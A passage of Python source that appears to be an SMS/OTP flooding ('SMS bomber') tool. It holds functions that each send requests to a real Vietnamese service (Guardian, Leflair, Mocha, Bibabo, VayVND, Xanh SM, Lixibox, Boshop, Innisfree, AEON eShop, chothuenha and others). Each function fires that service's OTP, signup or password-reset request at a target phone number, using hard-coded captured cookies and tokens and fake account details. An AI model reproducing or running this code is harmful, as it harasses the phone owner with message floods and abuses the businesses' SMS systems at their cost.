        '__RequestVerificationToken': 'CfDJ8APwjHfRbs5OtNrA7aABpe90_NsgssWG3CGNdSmA6jAEbAhH8dsJdTGt5R67IQvOfSjPEnjhzA-OO4I3KXPkSJCJzG6U2h-iZYuDf1XjcI2f2Itvn3_-h-tawbpH8ZcCZ-qB0_-U5r8nyJwv5P1rPH8',
    }

    response = requests.post('https://dchic.vn/tai-khoan/dang-ky', cookies=cookies, headers=headers, data=data)

    cookies = {
        '.AspNetCore.Antiforgery.de1fu8pHkYw': 'CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '.AspNetCore.Antiforgery.de1fu8pHkYw=CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
        'origin': 'https://dchic.vn',
        'priority': 'u=1, i',
        'referer': 'https://dchic.vn/tai-khoan/password-recovery',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': sdt,
        'redirectUrl': '',
        '__RequestVerificationToken': 'CfDJ8APwjHfRbs5OtNrA7aABpe-Bk4NOq9nAEmj6NUIZVgjoFsLqnhlSp0bbTh51k1o3Jdy5XEPLdzcxZpBiVh6sE58Qs67K6utwUtG9CC1PENYy_ScMStXWMsg953cOSnPslZ2zqTQ2IyI51dCQUEnCMiU',
    }

    try:
        response = requests.post('https://dchic.vn/tai-khoan/password-recovery', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DCHIC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DCHIC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def guardian():
    cookies = {
        'SRV': '92f1c88d-78ea-46cc-a177-e20fe4d82a02',
        'PHPSESSID': 'f8c4g12cif92nlr8c5bul4hhkt',
        'form_key': 'hCDIFnr6otgBpV5N',
        'private_content_version': 'a21077efbd01778e4e806c261907e039',
        'form_key': 'hCDIFnr6otgBpV5N',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'section_data_ids': '{%22messages%22:1723359937}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'SRV=92f1c88d-78ea-46cc-a177-e20fe4d82a02; PHPSESSID=f8c4g12cif92nlr8c5bul4hhkt; form_key=hCDIFnr6otgBpV5N; private_content_version=a21077efbd01778e4e806c261907e039; form_key=hCDIFnr6otgBpV5N; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22messages%22:1723359937}',
        'origin': 'https://www.guardian.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.guardian.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'telephone': sdt,
    }

    try:
        response = requests.post(
            'https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUARDIAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUARDIAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def leflair():
    cookies = {
        'frontend_lang': 'vi_VN',
        'tz': 'Asia/Bangkok',
        'session_id': 'b6e2a47588941eada2233cd6d4b6a2e49f7c99f0',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'frontend_lang=vi_VN; tz=Asia/Bangkok; session_id=b6e2a47588941eada2233cd6d4b6a2e49f7c99f0',
        'origin': 'https://leflair.com',
        'priority': 'u=0, i',
        'referer': 'https://leflair.com/web/signup',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    data = {
        'csrf_token': 'ca636a76c13e676c6421d4e91eb3442288a975e6o1756713946',
        'login': sdt,
        'name': 'John Davis',
        'password': '123123123',
        'confirm_password': '123123123',
        'redirect': '',
        'token': '',
    }

    response = requests.post('https://leflair.com/web/signup', cookies=cookies, headers=headers, data=data)
    cookies = {
        'frontend_lang': 'vi_VN',
        'tz': 'Asia/Bangkok',
        'session_id': '158312f3f7e1ee90b1775eaaa3a651bd21f5fd21',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'frontend_lang=vi_VN; tz=Asia/Bangkok; session_id=158312f3f7e1ee90b1775eaaa3a651bd21f5fd21',
        'origin': 'https://leflair.com',
        'priority': 'u=0, i',
        'referer': 'https://leflair.com/web/reset_password',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    data = {
        'csrf_token': 'f5c5120c56b1eb9e1a524441a6a4e963f7dcd309o1756714017',
        'name': '',
        'login': sdt,
        'redirect': '',
        'token': '',
    }

    response = requests.post('https://leflair.com/web/reset_password', cookies=cookies, headers=headers, data=data)
    cookies = {
        'frontend_lang': 'vi_VN',
        'tz': 'Asia/Bangkok',
        'session_id': '158312f3f7e1ee90b1775eaaa3a651bd21f5fd21',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'frontend_lang=vi_VN; tz=Asia/Bangkok; session_id=158312f3f7e1ee90b1775eaaa3a651bd21f5fd21',
        'origin': 'https://leflair.com',
        'priority': 'u=1, i',
        'referer': 'https://leflair.com/web/validate_otp/0357156322',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    json_data = {
        'id': 1,
        'jsonrpc': '2.0',
        'method': 'call',
        'params': {
            'phone': sdt,
            'otp_type': 'reset_password',
        },
    }

    try:
        response = requests.post('https://leflair.com/web/send_otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LEFLAIR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LEFLAIR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha35():
    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"

    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"

    headers = {
    'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
    'Content-Type': "application/x-www-form-urlencoded",
    'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
    'APPNAME': "MC35",
    'mocha-api': "",
    'countryCode': "VN",
    'languageCode': "vi",
    'Accept-Language': "vi-VN;q=1"
    }

    try:
        response = requests.post(url, data=payload, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA35 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA35 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bibabo():
    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"

    params = {
    'phone': sdt,
    'reCaptchaToken': "undefined",
    'appId': "7",
    'version': "2"
    }

    headers = {
    'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json, text/plain, */*",
    'accept-language': "vi-VN,vi;q=0.9"
    }

    try:
        response = requests.get(url, params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIBABO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBABO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vayvnd():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    try:
        response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VAYVND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VAYVND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def xanhsm2():
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    params = {
    'aud': "user_app",
    'platform': "ios"
    }

    payload = json.dumps({
    "is_forgot_password": False,
    "phone": sdt_chuyen_doi,
    "provider": "VIET_GUYS"
    })

    headers = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
    'Accept': "application/json",
    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Content-Type': "application/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'accept-language': "vi",
    'platform': "iOS",
    'aud': "user_app"
    }

    try:
        response = requests.post(url, params=params, data=payload, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("XANHSM2 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("XANHSM2 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def xanhsmzl():
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    params = {
    'platform': "ios",
    'aud': "user_app"
    }

    payload = json.dumps({
    "phone": sdt_chuyen_doi,
    "is_forgot_password": False,
    "provider": "ZNS_ZALO"
    })

    headers = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
    'Accept': "application/json",
    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Content-Type': "application/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'accept-language': "vi",
    'platform': "iOS",
    'aud': "user_app"
    }

    try:
        response = requests.post(url, params=params, data=payload, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("XANHSMZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("XANHSMZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def lixibox():
    headers = {
        'Accept': 'application/json',
        'Referer': 'https://www.lixibox.com/',
        'UUID': '697557576',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Referrer-Url': 'https://www.google.com/',
        'Content-type': 'application/json',
    }

    json_data = {
        'request_type': 'phone_signup_verify',
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.lixibox.com/web/otps', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LIXIBOX | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LIXIBOX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def boshop():
    cookies = {
        'laravel_session': 'tLqjHznBtvlFj01L9FukLmdDgzCRmBvefdVkC7AB',
        'XSRF-TOKEN': 'eyJpdiI6ImdJaGk1UTZ2TkZHQ3ZyNEpSckV0UGc9PSIsInZhbHVlIjoiNHFTMmpCNGJESFc3SWVrdUpzNWdLMnhYM2gxZEZCQTBnXC8wWXZKY3ZadENRVTVLRFNkWFNzQ1JRVDQ3c2dUdGsiLCJtYWMiOiI4ZmQ0MzVmNTA1YTkzZDFmZTY2NGZjNGE2NWFkNWI2ZDM1ZmE3OWIwMzdkYTU5M2NmYjZhNWEyNTYwM2FjMmQwIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=tLqjHznBtvlFj01L9FukLmdDgzCRmBvefdVkC7AB; XSRF-TOKEN=eyJpdiI6ImdJaGk1UTZ2TkZHQ3ZyNEpSckV0UGc9PSIsInZhbHVlIjoiNHFTMmpCNGJESFc3SWVrdUpzNWdLMnhYM2gxZEZCQTBnXC8wWXZKY3ZadENRVTVLRFNkWFNzQ1JRVDQ3c2dUdGsiLCJtYWMiOiI4ZmQ0MzVmNTA1YTkzZDFmZTY2NGZjNGE2NWFkNWI2ZDM1ZmE3OWIwMzdkYTU5M2NmYjZhNWEyNTYwM2FjMmQwIn0%3D',
        'Origin': 'https://www.boshop.vn',
        'Referer': 'https://www.boshop.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-CSRF-TOKEN': 'UanHtlfN19B4om7XswmBX3ZWgLHHDfqWXS45RCaM',
        'X-XSRF-TOKEN': 'eyJpdiI6ImdJaGk1UTZ2TkZHQ3ZyNEpSckV0UGc9PSIsInZhbHVlIjoiNHFTMmpCNGJESFc3SWVrdUpzNWdLMnhYM2gxZEZCQTBnXC8wWXZKY3ZadENRVTVLRFNkWFNzQ1JRVDQ3c2dUdGsiLCJtYWMiOiI4ZmQ0MzVmNTA1YTkzZDFmZTY2NGZjNGE2NWFkNWI2ZDM1ZmE3OWIwMzdkYTU5M2NmYjZhNWEyNTYwM2FjMmQwIn0=',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.boshop.vn/api-mobile/phone-login-send-otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BOSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BOSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def innisfree():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'ajax': 'true',
        'authorization': 'null',
        'cache': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': 'XSRF-TOKEN=f7c1da5a-766c-4686-889e-b250ad1ce31a; SESSION=ZGMyZTcxOTEtNDBjMS00OTZhLWFmNzAtNTUzYjFkNTBkODY3; RB_PCID=1725091307380345696; EG_GUID=7e4a0a77-c463-4008-af21-66b3ba9c3be4; G_ENABLED_IDPS=google; f7c1da5a-766c-4686-889e-b250ad1ce31a; RB_SSID=6KR7mCyhuv; AWSALB=Qg5ItmzAOFlupaGmCEVN4dQZhK4Hr+pxmjxyAy4xcNTJwOUSP8xKebVbrU7zNAuBiGIl64NI3uG56brstkemCTcLxZDFknziW43V8MDBLFJV1Ufx5yET5xQWMYym; AWSALBCORS=Qg5ItmzAOFlupaGmCEVN4dQZhK4Hr+pxmjxyAy4xcNTJwOUSP8xKebVbrU7zNAuBiGIl64NI3uG56brstkemCTcLxZDFknziW43V8MDBLFJV1Ufx5yET5xQWMYym',
        'crossdomain': 'true',
        'origin': 'https://www.innisfree.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.innisfree.vn/member/join',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'withcredentials': 'true',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'f7c1da5a-766c-4686-889e-b250ad1ce31a',
    }

    data = {
        'mobileno': sdt,
    }

    try:
        response = requests.post('https://www.innisfree.vn/incom/authNumberSendProc', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("INNISFREE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("INNISFREE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def aeoneshop():
    cookies = {
        'crumb': '6HEODy3Wk3agQvim_Th9a8Fb8uQY2f88Ahc9B2vsap2',
        'deviceId': '6de183e4-56a0-4edc-93ef-8958b78d2345',
        'i18next': 'vi-VN',
        'locationCaptured': 'true',
        'locationIdentifierIds': '6476ec32b597582eddf0df29',
        'selectedCity': 'Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh',
        'selectedDistrict': 'Qu%E1%BA%ADn%2001',
        'selectedWard': 'Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9',
        'interstitialCount': 'IntcIjY3MzE2ODRiOGFlZTY3NTNmYzhmNjBkZVwiOjF9Ig==',
        'superSessionData': '{%22interstitials%22:[%226731684b8aee6753fc8f60de%22]}',
        'aeon-vn-prodnxweb.sid': 'Fe26.2**ba4993c8f5b4aaf69c1ea1b0ac995b8363dc63e8b35b5feb172be12243d9b8d6*mWTDOviW4q2jdvLdPLEJbA*M7UkIy0Ht9DqAEqcfkehZB9i0abbkSfCWZLbg8vieRMMJZZ_hBWVCFNtwtP2RMHb**86a730267828915845c3f643d7f16e7a1850eb8a7816abe74b6569e1d8166179*R6xxtIXe63uvYfE1iZ92HDwx8DciaeEReHDF0s0BhYo',
        'superSession': '{%22id%22:%226de183e4-56a0-4edc-93ef-8958b78d2345-1731815692170%22%2C%22expiry%22:1731817495141}',
        'datadome': '3AqaVcenEKgdCgXrgdmyNkPMWpn8qhjdJsiv45FycrKwdfSj3MRpMtoaXmzlqyhRuNwj_ESrE833veBXP43iDUa64riXGcYTHL_BPBgzBix0vHaUwavzP9WE3KGAf5xV',
        '_dd_s': 'rum=1&id=84fa6373-f610-4c38-b8fe-b7a478f82424&created=1731815692035&expire=1731816628932',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'api-json': 'true',
        'content-type': 'application/json',
        # 'cookie': 'crumb=6HEODy3Wk3agQvim_Th9a8Fb8uQY2f88Ahc9B2vsap2; deviceId=6de183e4-56a0-4edc-93ef-8958b78d2345; i18next=vi-VN; locationCaptured=true; locationIdentifierIds=6476ec32b597582eddf0df29; selectedCity=Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh; selectedDistrict=Qu%E1%BA%ADn%2001; selectedWard=Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9; interstitialCount=IntcIjY3MzE2ODRiOGFlZTY3NTNmYzhmNjBkZVwiOjF9Ig==; superSessionData={%22interstitials%22:[%226731684b8aee6753fc8f60de%22]}; aeon-vn-prodnxweb.sid=Fe26.2**ba4993c8f5b4aaf69c1ea1b0ac995b8363dc63e8b35b5feb172be12243d9b8d6*mWTDOviW4q2jdvLdPLEJbA*M7UkIy0Ht9DqAEqcfkehZB9i0abbkSfCWZLbg8vieRMMJZZ_hBWVCFNtwtP2RMHb**86a730267828915845c3f643d7f16e7a1850eb8a7816abe74b6569e1d8166179*R6xxtIXe63uvYfE1iZ92HDwx8DciaeEReHDF0s0BhYo; superSession={%22id%22:%226de183e4-56a0-4edc-93ef-8958b78d2345-1731815692170%22%2C%22expiry%22:1731817495141}; datadome=3AqaVcenEKgdCgXrgdmyNkPMWpn8qhjdJsiv45FycrKwdfSj3MRpMtoaXmzlqyhRuNwj_ESrE833veBXP43iDUa64riXGcYTHL_BPBgzBix0vHaUwavzP9WE3KGAf5xV; _dd_s=rum=1&id=84fa6373-f610-4c38-b8fe-b7a478f82424&created=1731815692035&expire=1731816628932',
        'origin': 'https://aeoneshop.com',
        'priority': 'u=1, i',
        'referer': 'https://aeoneshop.com/',
        'sec-ch-device-memory': '8',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-full-version-list': '"Chromium";v="128.0.6613.186", "Not;A=Brand";v="24.0.0.0", "Opera";v="114.0.5282.185"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': '6HEODy3Wk3agQvim_Th9a8Fb8uQY2f88Ahc9B2vsap2',
    }

    json_data = {
        'email': 'licehe9526@newcupon.com',
        'phone': f'84{sdt[1:10]}',
        'type': 'userRegistration',
    }

    try:
        response = requests.post('https://aeoneshop.com/api/issue-otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AEONESHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AEONESHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def chothuenha():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6InJiSlZ6aGFzRUJIUExPRFJEaWRUQXc9PSIsInZhbHVlIjoiSjFjcGRKVkp4T0I3L2FyU2tOL3A5NW1rZjVXWWlWM2JtMGQyVC9UbThoZ3hxa0s3SGJjSnQrVmxiNFZXcm1rYitUNXhaL1d3VW9Rc05ZUVJIN1R5R0p0L2pLVjZjYlNnQVdieWVEZkZsV0g3dXhUaEhMeXkzREV5SG1KWDY4a2kiLCJtYWMiOiI1MTY3ZTA3NzBiN2VhNTIwYzgyMmM0ZWMxZmVmMTIzNmQ4MTQwYzNkNzZlZTZmODhhMDg4Y2QyMzdiNTA4OGNmIiwidGFnIjoiIn0%3D',
        'bds123_session': 'RVrQwKuFOSlPeTrpYMZ2tqEQBfHpfiissfUkEXl9',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6InJiSlZ6aGFzRUJIUExPRFJEaWRUQXc9PSIsInZhbHVlIjoiSjFjcGRKVkp4T0I3L2FyU2tOL3A5NW1rZjVXWWlWM2JtMGQyVC9UbThoZ3hxa0s3SGJjSnQrVmxiNFZXcm1rYitUNXhaL1d3VW9Rc05ZUVJIN1R5R0p0L2pLVjZjYlNnQVdieWVEZkZsV0g3dXhUaEhMeXkzREV5SG1KWDY4a2kiLCJtYWMiOiI1MTY3ZTA3NzBiN2VhNTIwYzgyMmM0ZWMxZmVmMTIzNmQ4MTQwYzNkNzZlZTZmODhhMDg4Y2QyMzdiNTA4OGNmIiwidGFnIjoiIn0%3D; bds123_session=RVrQwKuFOSlPeTrpYMZ2tqEQBfHpfiissfUkEXl9',
        'origin': 'https://chothuenha.me',
        'priority': 'u=1, i',
        'referer': 'https://chothuenha.me/dang-ky.html',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
        'x-csrf-token': 'hXLYuBnLYSj8lRBA1EEan7c8ZtoLgZ1MKxa5HLl7',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc huuh',
        'phone': sdt,
        'password': '123123aA@',
        'user_type': '1',
        'business': '0',
        'cmnd': [
            '',
            '',
        ],
    }

    response = requests.post('https://chothuenha.me/api/user/register', cookies=cookies, headers=headers, data=data)
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6Imw2UkVLbVZSblhUT2NXaWF6SWZEMXc9PSIsInZhbHVlIjoiY2tWZkgwcDArZ2MvUEZiMXJEUTBHR0QwV0J2dDdTRkxMQlBNMUF6eTVxL2QxV3RiQWtyR2hOT3VMSURoTmo2TlNIU3phbmVKUDNpNnNEQzZoaCtja3F1STZaYVMyWEppN2ZkWmNJV2dDWTNHdGEwRHRkZFFMeFlmVDRMMG96RksiLCJtYWMiOiIyZDczMDYyMDExOTBjYTlkYjQ0YzUzYTQxMzVlNDU2ZjBjZGUxZjRhYWM2Y2VkYTM4ZmQ2NjkxZjI4N2I1MzIyIiwidGFnIjoiIn0%3D',
